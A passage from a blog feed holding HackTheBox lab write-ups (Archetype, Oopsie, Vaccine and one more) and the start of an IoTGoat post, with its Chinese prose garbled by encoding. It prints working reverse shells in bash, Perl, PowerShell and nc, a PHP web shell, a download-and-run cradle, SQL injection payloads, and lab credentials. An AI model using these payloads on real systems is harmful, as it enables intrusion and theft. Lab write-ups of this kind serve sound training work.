    <content type="html"><![CDATA[<p>æ‰«æå‡ºæ¥80 ISSå’Œ 3306 mysql</p><p>bpå‘ç°è·¯å¾„ä¸‹æœ‰wordpress</p><p>æŸ¥çœ‹wordpressç‰ˆæœ¬ï¼Œç½‘é¡µæœç´¢<code>generator</code>å³å¯æœåˆ°<code>generator</code></p><p>wordpress ç™»é™†ç•Œé¢ï¼Œä½¿ç”¨çœ‹åˆ°çš„adminè´¦æˆ·å’Œå…ˆå‰çš„å¯†ç ç™»å½•å³å¯ã€‚</p><p>ä½¿ç”¨msfçš„<code>exploit/unix/webapp/wp_admin_shell_upload</code>å°±å¯ä»¥è·å¾—meterpreter shellï¼Œæ³¨æ„è¦è®¾ç½®LHOSTSä¸ç„¶å¼¹ä¸å›æ¥</p><blockquote><p><img src="../RelatedBox/Metasploit%20%E4%BB%8B%E7%BB%8D.md#Meterpreter" alt="Meterpreter"></p></blockquote><p><code>cd C:/inetpub/wwwroot/wordpress/wp-content/uploads</code></p><p>åœ¨<code>\wordpress\wp-content\uploads</code>ç›®å½•ä¸‹ä¸Šä¼ nc<br><code>upload /home/kali/Desktop/tools/windows-exe/nc.exe</code></p><p>åå¼¹shell<code>execute -f nc.exe -a &quot;-e cmd.exe 10.10.14.87 4444&quot;</code></p><p>è¿™é‡Œæˆ‘å‚»äº†ç«¯å£è·Ÿmsfçš„meterpreteré‡å¤äº†ï¼Œæ‰€ä»¥è·å–ä¸åˆ°shellï¼Œå¹¶ä¸”ncä¹Ÿä¸æ”¯æŒ-eã€‚ã€‚ã€‚</p><p>ä½¿ç”¨<a href="https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip">è¿™ä¸ª</a>å¯ä»¥</p><p>åœ¨metepreteré‡Œå¯ä»¥ä½¿ç”¨<code>sysinfo</code>æŸ¥çœ‹osä¿¡æ¯</p><p>æŸ¥çœ‹åˆ°windowsserver2016 å¯ä»¥ä½¿ç”¨ <a href="https://github.com/ohpe/juicy-potato">è¿™ä¸ª</a></p><p>ä¸Šä¼ ä¸€ä¸ªå†…å®¹ä¸º</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-built_in">START</span> C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">14</span>.<span class="hljs-number">87</span> <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure><p>çš„batè„šæœ¬</p><p><code>upload /home/kali/Desktop/HTB/StartingPoint/29/shell.bat</code></p><p>éšåï¼Œå…ˆç›‘å¬æ–°çš„ç«¯å£<code>nc -lvp 1111</code><br>åœ¨ç¬¬ä¸€æ¬¡è·å–çš„shellä¸­<code>js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337</code></p><p>æˆåŠŸå³å¯è·å¾—adminæƒé™çš„powershell</p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>winç§»åŠ¨è¦ä½¿ç”¨/ / /ï¼Œä¸èƒ½ç®€å•å¤åˆ¶linuxçš„\ \ \ \ </p><p>ä¸€èˆ¬æ¶æ„è½¯ä»¶éœ€è¦æ”¹åï¼Œä¸ç„¶æ›´å®¹æ˜“è¢«defenderè¯†åˆ«</p><p>msfè·å–çš„shellæ„Ÿè§‰ä¸æ˜¯ç‰¹åˆ«çš„ç¨³å®š</p><p>è¿™åº”è¯¥å«ä½¿ç”¨cveè·å–é«˜æƒé™å†åå¼¹å‡ºæ¥</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox Starting point Vaccine .46</title>
    <link href="/2020/12/17/HackTheBox%20Starting%20point%20Vaccine%20.46/"/>
    <url>/2020/12/17/HackTheBox%20Starting%20point%20Vaccine%20.46/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æ‰«æä¹‹åæœ‰ftpï¼Œsshå’Œweb</p><p>è”æƒ³åˆ°ä¹‹å‰è·å¾—çš„ftpè´¦æˆ·ï¼Œè¾“å…¥è¿›å»ç™»å½•åè·å¾—äº†backup.zip</p><p>ä½¿ç”¨Seclistçš„å­—å…¸ï¼Œé€šè¿‡çˆ†ç ´è·å¾—å¯†ç ï¼ŒæˆåŠŸç™»é™†è¿›çš„äº†åå°</p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>è·å¾—ç™»é™†å¯†ç çš„md5ï¼Œè§£å¼€åç™»é™†è¿›åå°è·³è½¬åˆ°dashboard</p><p>æ¨æµ‹ç™»é™†é¡µé¢sqlä¸ºselect * from table where name = Inputï¼Œè¾“å…¥<code>sport&#39;+and+1=1</code>ï¼Œæ ¹æ®é¡µé¢è¿”å›çš„æŠ¥é”™ä¿¡æ¯<code>ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: Select * from cars where name ilike &#39;%sport&#39; and 1=1%&#39; ^</code></p><p>xrayæ‰«æç»“æœ</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs swift">[<span class="hljs-type">Vuln</span>: sqldet]<br><span class="hljs-type">Target</span>           <span class="hljs-string">&quot;http://10.10.10.46/dashboard.php?search=1&quot;</span>       <br><span class="hljs-type">VulnType</span>         <span class="hljs-string">&quot;blind-based/default&quot;</span>                            <br><span class="hljs-type">Payload</span>          <span class="hljs-string">&quot;1&#x27;/**/and(select&#x27;1&#x27;from/**/pg_sleep(2))&gt;&#x27;0&quot;</span> <br><span class="hljs-type">Position</span>         <span class="hljs-string">&quot;query&quot;</span>                                       <br><span class="hljs-type">ParamKey</span>         <span class="hljs-string">&quot;search&quot;</span>                                        <br><span class="hljs-type">ParamValue</span>       <span class="hljs-string">&quot;1&#x27;/**/and(select&#x27;1&#x27;from/**/pg_sleep(2))&gt;&#x27;0&quot;</span>   <br>std_dev          <span class="hljs-string">&quot;5&quot;</span>                                          <br>sleep_time       <span class="hljs-string">&quot;2000&quot;</span>                                       <br>p_time           <span class="hljs-string">&quot;187&quot;</span>                                       <br>n_time           <span class="hljs-string">&quot;2191&quot;</span>                                           <br>stat             <span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>normal<span class="hljs-subst">\&quot;</span>:&#123;<span class="hljs-subst">\&quot;</span>samples<span class="hljs-subst">\&quot;</span>:[193,187,200,194,184,194],<span class="hljs-subst">\&quot;</span>avg<span class="hljs-subst">\&quot;</span>:192,<span class="hljs-subst">\&quot;</span>std_dev<span class="hljs-subst">\&quot;</span>:5.196152422706632,<span class="hljs-subst">\&quot;</span>sleep_time<span class="hljs-subst">\&quot;</span>:2&#125;,<span class="hljs-subst">\&quot;</span>sleep_0_time<span class="hljs-subst">\&quot;</span>:187,<span class="hljs-subst">\&quot;</span>quick_check<span class="hljs-subst">\&quot;</span>:&#123;<span class="hljs-subst">\&quot;</span>samples<span class="hljs-subst">\&quot;</span>:[2191],<span class="hljs-subst">\&quot;</span>sleep<span class="hljs-subst">\&quot;</span>:2&#125;,<span class="hljs-subst">\&quot;</span>verify<span class="hljs-subst">\&quot;</span>:&#123;<span class="hljs-subst">\&quot;</span>samples<span class="hljs-subst">\&quot;</span>:[3189,3193,3189],<span class="hljs-subst">\&quot;</span>sleep<span class="hljs-subst">\&quot;</span>:3&#125;&#125;&quot;</span>                                                                                                <br>title            <span class="hljs-string">&quot;Generic PostgreSQL time based case [&#x27;string&#x27;]&quot;</span>                     <br>type             <span class="hljs-string">&quot;time_based&quot;</span>                               <br>avg_time         <span class="hljs-string">&quot;192&quot;</span>   <br></code></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºsqlmapçš„cookieå¼„é”™äº†ç»•äº†å¼¯è·¯ã€‚ã€‚é…ç½®å¯¹çš„sqlmapç›´æ¥å°±èƒ½æ£€æµ‹åˆ°sqlæ³¨å…¥å¹¶è·å¾—shell</p><p>æŸ¥çœ‹<code>/var/www/html/dashboard.php</code>åè·å¾—å¯†ç <code>P@s5w0rd!</code></p><p>è·å¾—os-shellä¹‹ååå¼¹shell<br><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.180/4444 0&gt;&amp;1&#39;</code></p><p><code>sudo -l</code> åˆ—å‡ºç»è¿‡å®‰å…¨ç­–åˆ—å…è®¸çš„æŒ‡ä»¤</p><p>å°†ç®€å•shellå˜æˆtty</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">SHELL=<span class="hljs-regexp">/bin/</span>bash script -q <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br>python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><h2 id="è¦ç‚¹"><a href="#è¦ç‚¹" class="headerlink" title="è¦ç‚¹"></a>è¦ç‚¹</h2><p>ftpçš„ä½¿ç”¨</p><p>çˆ†ç ´å¯†ç </p><p>postgresql æ³¨å…¥å’Œä½¿ç”¨</p><p>sqlmap</p><p>apacheçš„é…ç½®æ–‡ä»¶è·å–è´¦å¯†</p><p>ä½¿ç”¨viææƒ</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox Starting Point Oopsie .28</title>
    <link href="/2020/12/04/HackTheBox%20Starting%20Point%20Oopsie%20.28/"/>
    <url>/2020/12/04/HackTheBox%20Starting%20Point%20Oopsie%20.28/</url>
    
    <content type="html"><![CDATA[<p>æ‰«æç»“æœ</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs inform7">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-03 06:15 EST<br>Nmap scan report for 10.10.10.28<br>Host <span class="hljs-keyword">is</span> up (0.49s latency).<br><br>PORT     STATE  SERVICE          VERSION<br>21/tcp   <span class="hljs-keyword">closed</span> ftp<br>23/tcp   <span class="hljs-keyword">closed</span> telnet<br>53/tcp   <span class="hljs-keyword">closed</span> domain<br>80/tcp   <span class="hljs-keyword">open</span>   http             Apache httpd 2.4.29 ((Ubuntu))                                                                                                                                                                            <br>|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                                                               <br>|_http-title: Welcome                                                                                                                                                                                                                      <br>110/tcp  <span class="hljs-keyword">closed</span> pop3                                                                                                                                                                                                                       <br>111/tcp  <span class="hljs-keyword">closed</span> rpcbind                                                                                                                                                                                                                    <br>113/tcp  <span class="hljs-keyword">closed</span> ident                                                                                                                                                                                                                      <br>135/tcp  <span class="hljs-keyword">closed</span> msrpc<br>139/tcp  <span class="hljs-keyword">closed</span> netbios-ssn<br>143/tcp  <span class="hljs-keyword">closed</span> imap<br>256/tcp  <span class="hljs-keyword">closed</span> fw1-secureremote<br>445/tcp  <span class="hljs-keyword">closed</span> microsoft-ds<br>587/tcp  <span class="hljs-keyword">closed</span> submission<br>993/tcp  <span class="hljs-keyword">closed</span> imaps<br>995/tcp  <span class="hljs-keyword">closed</span> pop3s<br>1723/tcp <span class="hljs-keyword">closed</span> pptp<br>3306/tcp <span class="hljs-keyword">closed</span> mysql<br>3389/tcp <span class="hljs-keyword">closed</span> ms-wbt-server<br>5900/tcp <span class="hljs-keyword">closed</span> vnc<br>8080/tcp <span class="hljs-keyword">closed</span> http-proxy<br>8888/tcp <span class="hljs-keyword">closed</span> sun-answerbook<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 33.00 seconds<br><br></code></pre></td></tr></table></figure><p>æ‰“å¼€å¯¹åº”80ç«¯å£ <a href="http://10.10.10.28/#">http://10.10.10.28/#</a></p><p>çœ‹äº†çœ‹æ²¡æœ‰å•¥ï¼Œæ‰«æè·¯å¾„èµ°èµ·</p><p>æ‰«å‡ºæ¥ä¸€ä¸ªç™»å½• <a href="http://10.10.10.28/cdn-cgi/login/i">http://10.10.10.28/cdn-cgi/login/i</a></p><p>å¯†ç ç”¨çš„æ˜¯å‰é¢windowæœºå™¨è·å–çš„ï¼ï¼ï¼wdnmd</p><p>è¿›å»ä¹‹åï¼ŒAccounté¡µé¢</p><p><code>http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code></p><p>è¿™ä¸ªid = 1ï¼Œçˆ†ç ´ä¸€ä¸‹ä¹‹åï¼Œçˆ†å‡ºæ¥30çš„æ—¶å€™æŸ¥è¯¢åˆ°äº†super adminçš„idå’Œè´¦æˆ·</p><p>è€Œåœ¨uploadç•Œé¢ï¼Œå°±éœ€è¦super adminçš„cookieæ‰èƒ½è®¿é—®åˆ°ä¸Šä¼ </p><p>ä½¿ç”¨dirsearchå·¥å…·å¯ä»¥æ‰¾åˆ°<code>/uploads/</code>ã€‚ ä¸Šä¼ çš„phpå°±ä¿å­˜åˆ°äº†è¿™é‡Œ</p><p>è¿™é‡Œæˆ‘ä½¿ç”¨phpä¸€å¥è¯åå¼¹shellè¿ä¸Šå°±æ–­ï¼Œä½¿ç”¨perlå°±å¯ä»¥æ­£å¸¸è¿æ¥ã€‚</p><p>test.php<br><code>&lt;?php echo shell_exec($_GET[&#39;shell&#39;]);?&gt;</code></p><p>è®¿é—®link<br><code>http://10.10.10.28/uploads/test.php?shell=perl%20-MIO%20-e%20%27$p=fork;exit,if($p);$c=new%20IO::Socket::INET(PeerAddr,%2210.10.14.214:4444%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);system$_%20while%3C%3E;%27</code></p><p>å¯¹åº”perlå‘½ä»¤<code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></p><p>å¯çœ‹<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl">swisskyrepo/PayloadsAllTheThings</a></p><p>è¿è¿›å»ä¹‹åéœ€è¦ææƒ</p><blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">SHELL=<span class="hljs-regexp">/bin/</span>bash script -q <span class="hljs-regexp">/dev/</span>null<span class="hljs-regexp">//</span>è§æ³¨è§£<span class="hljs-number">1</span><br>&gt;Ctrl-Z<span class="hljs-regexp">//</span>è§æ³¨è§£<span class="hljs-number">2</span><br>&gt;stty raw -echo<span class="hljs-regexp">//</span>è§æ³¨è§£<span class="hljs-number">3</span><br>&gt;fg<span class="hljs-regexp">//</span>è§æ³¨è§£<span class="hljs-number">4</span><br>&gt;reset<span class="hljs-regexp">//</span>è§æ³¨è§£<span class="hljs-number">5</span><br>&gt;xterm<span class="hljs-regexp">//</span>è§æ³¨è§£<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><ol><li>å°†åœ¨ç¯å¢ƒå˜é‡ä¸‹å°†shellè®¾ç½®ä¸º/bin/bashä¸”å‚æ•°ä¸º-qå’Œ/dev/nullçš„æƒ…å†µä¸‹è¿è¡Œè„šæœ¬ï¼Œ-qå‚æ•°ä¸ºé™é»˜è¿è¡Œï¼Œè¾“å‡ºåˆ°/dev/nullï¼ˆé»‘æ´ï¼‰é‡Œï¼Œå¦‚æœä¸åŠ script -q /dev/nullä¸ä¼šæ–°å¯ä¸€ä¸ªbashï¼Œshell=/bin/bashåªæ˜¯è®¾ç½®shellä¸ºbashï¼ŒåŠ äº†ä»¥åä¼šç»™ä½ æŒ‚èµ·ä¸€ä¸ªæ–°çš„shellï¼Œå¹¶å¸®ä½ è®°å½•æ‰€æœ‰å†…å®¹</li><li>å°†netcatæš‚æŒ‚è‡³åå°</li><li>å°†æœ¬åœ°ç»ˆç«¯ç½®äºåŸå§‹æ¨¡å¼ï¼Œä»¥å…å¹²æ‰°è¿œç¨‹ç»ˆç«¯</li><li>å°†netcatè¿”å›åˆ°å‰å°ï¼Œæ³¨æ„ï¼šè¿™é‡Œä¸ä¼šæ˜¾ç¤ºè¾“å…¥çš„å‘½ä»¤</li><li>é‡ç½®è¿œç¨‹ç»ˆç«¯ï¼Œç»æµ‹è¯•ä¹Ÿå¯ä»¥ä¸è¿›è¡Œæ­¤æ“ä½œ</li><li>è¿è¡Œxterm<br>æ¥æº <a href="https://blog.csdn.net/m0_48066270/article/details/108641892">æ¸—é€æµ‹è¯•ç»ƒä¹ é¶åœºhacktheboxâ€”â€”Starting Point Oopsieæ”»ç•¥_TF0xnçš„åšå®¢-CSDNåšå®¢</a></li></ol></blockquote><p>åœ¨ç›®å½•ä¹‹é—´æ‰¾äº†æ‰¾ä¹‹åï¼Œåœ¨<code>cdn-cgi/login</code>æ‰¾åˆ°ä¸ª<code>db.php</code>ï¼Œé‡Œè¾¹æœ‰ä¸ªè´¦æˆ·å¯†ç ï¼Œsu åˆ‡æ¢è¿‡å»å°±æœ‰äº†ç”¨æˆ·æƒé™ã€‚</p><p><code>ls -lh $(find / -perm -u=s -type f 2&gt;/dev/null)</code>æŸ¥çœ‹æœ‰SUIDæƒé™ çš„å¯æ‰§è¡Œæ–‡ä»¶</p><p>ä½¿ç”¨<code>cat /etc/group</code>æŸ¥çœ‹bugtrackerç”¨æˆ·ç»„</p><p>å‘ç°å¯ä»¥è¿è¡Œå°±ç›´æ¥<code>/usr/bin/bugtracker</code>æ‰§è¡Œäº†ï¼Œå‘ç°çœ‹èµ·æ¥æ˜¯ä¸ªcatçš„ä»£ç æ‰§è¡Œï¼Œå°è¯•<code>;</code>å‘½ä»¤æ³¨å…¥æˆåŠŸï¼Œè·å–äº†rootæƒé™</p><p><code>ls -lRa /root</code>æŸ¥æ‰¾rootè·¯å¾„ä¸‹æœ‰ä»€ä¹ˆ</p><blockquote><p>-R, â€“recursive            list subdirectories recursively</p></blockquote><blockquote><p>Inside rootâ€™s folder, we see a .config folder, which contains a FileZilla config file with the credentials ftpuser / mc@F1l3ZilL4 visible in plain text.</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox Starting Point Archetype .27</title>
    <link href="/2020/12/03/HackTheBox%20Starting%20Point%20Archetype%20.27/"/>
    <url>/2020/12/03/HackTheBox%20Starting%20Point%20Archetype%20.27/</url>
    
    <content type="html"><![CDATA[<h2 id="VPN-è¿æ¥"><a href="#VPN-è¿æ¥" class="headerlink" title="VPN è¿æ¥"></a>VPN è¿æ¥</h2><p><code>sudo openvpn example.ovpn</code></p><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>Sql serverç›¸å…³ï¼Œè¿™éƒ¨åˆ†æ€»æç¤ºæˆ‘connection reset by peer æ— æ³•å®éªŒ</p><p>é“¾æ¥åˆ°sql server</p><p>impacket/examples/<code>mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p><p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code> åˆ¤æ–­è‡ªå·±æœ‰æ²¡æœ‰sysadminï¼ˆæœ€é«˜çº§åˆ«ï¼‰çš„æƒé™ã€‚æœ‰çš„è¯ä¼šå…è®¸å¯åŠ¨<code>xp_cmdshell</code>è¿œç¨‹æ‰§è¡Œä»£ç ã€‚å¯ç”¨æ–¹æ³•</p><figure class="highlight sql"><figcaption><span>server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;Show Advanced Options&#x27;</span>, <span class="hljs-number">1</span>;<br>reconfigure;<br>sp_configure;<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><br>reconfigure;<br>xp_cmdshell &quot;whoami&quot; <br></code></pre></td></tr></table></figure><p>é€šè¿‡powershellåå¼¹shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.14.3&quot;</span>,<span class="hljs-number">443</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡pythonèµ·ä¸€ä¸ªmini webæœåŠ¡æ¥æ‰˜ç®¡æ–‡ä»¶</p><p><code>python3 -m http.server 80</code></p><p>åœ¨é€šè¿‡netcatç›‘å¬æœ¬æœº443ç«¯å£ä¹‹åï¼Œè®¾ç½®<code>ufw</code>å…è®¸è®¿é—®æœ¬æœºç«¯å£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">443</span><br><span class="hljs-attribute">ufw</span> <span class="hljs-literal">allow</span> from <span class="hljs-number">10.10.10.27</span> proto tcp to any port <span class="hljs-number">80</span>,<span class="hljs-number">443</span> <br></code></pre></td></tr></table></figure><p>ç„¶åè¿œç¨‹æ‰§è¡Œè„šæœ¬</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">xp_cmdshell &quot;powershell &quot;IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(\&quot;http://10.10.14.3/shell.ps1\&quot;);&quot; <br></code></pre></td></tr></table></figure><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>æ£€æŸ¥æœ€è¿‘é€šè¿‡powershellè¾“å…¥çš„å‘½ä»¤<br><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></p><p>æŸ¥çœ‹åˆ°æœ‰è¾“å…¥çš„æŒ‡ä»¤<br>![](HackTheBox Starting Point Archetype .27/image-20201203151558.png)</p><p>backupsè¿™ä¸ªç£ç›˜æ˜¯é€šè¿‡ç®¡ç†å‘˜å‡­è¯æ˜ å°„çš„ã€‚å¯ä»¥é€šè¿‡Impacketsçš„<code>psexec.py</code>æ¥è·å¾—ç®¡ç†å‘˜æƒé™</p><p><code>psexec.py administraotr@10.10.10.27</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>IoTGoat</title>
    <link href="/2020/11/03/IoTGoat/"/>
    <url>/2020/11/03/IoTGoat/</url>
    
    <content type="html"><![CDATA[<h2 id="No-1-Weak-Guessable-or-Hardcoded-Passwords"><a href="#No-1-Weak-Guessable-or-Hardcoded-Passwords" class="headerlink" title="No 1: Weak, Guessable, or Hardcoded Passwords:"></a>No 1: Weak, Guessable, or Hardcoded Passwords:</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">find</span> . -name cgi-bin<br>.<span class="hljs-regexp">/www/</span>cgi-bin<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ï¼Œ<a href="https://github.com/craigz28/firmwalker">firmwalker</a></p><blockquote><p>It will search through the extracted or mounted firmware file system for things of interest such as:</p><ul><li>etc/shadow and etc/passwd</li><li>list out the etc/ssl directory</li><li>search for SSL related files such as .pem, .crt, etc.</li><li>search for configuration files</li><li>look for script files</li><li>search for other .bin files</li><li>look for keywords such as admin, password, remote, etc.</li><li>search for common web servers used on IoT devices</li><li>search for common binaries such as ssh, tftp, dropbear, etc.</li><li>search for URLs, email addresses and IP addresses</li><li>Experimental support for making calls to the Shodan API using the Shodan CLI</li></ul></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ .<span class="hljs-regexp">/firmwalker.sh ../</span>firmware<span class="hljs-regexp">/_IoTGoat-x86.img.extracted/</span>squashfs-root<span class="hljs-regexp">/ ./</span>IoTGoat.txt<br></code></pre></td></tr></table></figure><blockquote><p><strong>/etc/shadow</strong><br>ä¿å­˜äº†åŠ å¯†çš„çœŸå®å¯†ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">root:$1$Jl7H1VOG<span class="hljs-variable">$Wgw2F</span>/C.nLNTC.4pwDa4H1:</span><br><span class="hljs-meta">&gt;</span><span class="bash">|                |</span><br><span class="hljs-meta">&gt;</span><span class="bash">1                2</span><br></code></pre></td></tr></table></figure><ol><li><p><strong>Username</strong> : It is your login name.</p></li><li><p><strong>Password</strong>: It is your encrypted password. The password should be minimum 8-12 characters long including special characters, digits, lower case alphabetic and more. Usually password format is set to</p><p><code>$id$salt$hashed</code>, The<code>$id</code>is the algorithm used On GNU/Linux as follows:</p><ol><li><code>$1$</code> is MD5</li><li><code>$2a$</code> is Blowfish</li><li><code>$2y$</code>is Blowfish</li><li><code>$5$</code> is SHA-256</li><li><code>$6$</code>is SHA-512</li></ol><p><a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/">more</a></p></li></ol></blockquote><p>çˆ†ç ´å¯†ç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ john --show .<span class="hljs-regexp">/etc/</span>shadow<br><span class="hljs-number">0</span> password hashes cracked, <span class="hljs-number">2</span> left<br></code></pre></td></tr></table></figure><p>hashcatä¹Ÿå¯ä»¥è§£å¯†md5ç­‰ï¼Œå¾ˆå¼ºå¤§ä½†æ˜¯æˆ‘ä¸å¤§ä¼šç”¨ã€‚ã€‚</p><p>medusa</p><blockquote><p>Hydra, Medusa, or Ncrackéƒ½å¯ä»¥ç”¨æ¥çˆ†ç ´</p></blockquote><p>åŠ ä¸Šä½¿ç”¨<a href="https://github.com/danielmiessler/SecLists">SecList</a></p><blockquote><p>SecLists is the security testerâ€™s companion. Itâ€™s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more. </p></blockquote><p>ä½¿ç”¨å‘½ä»¤<code>awk 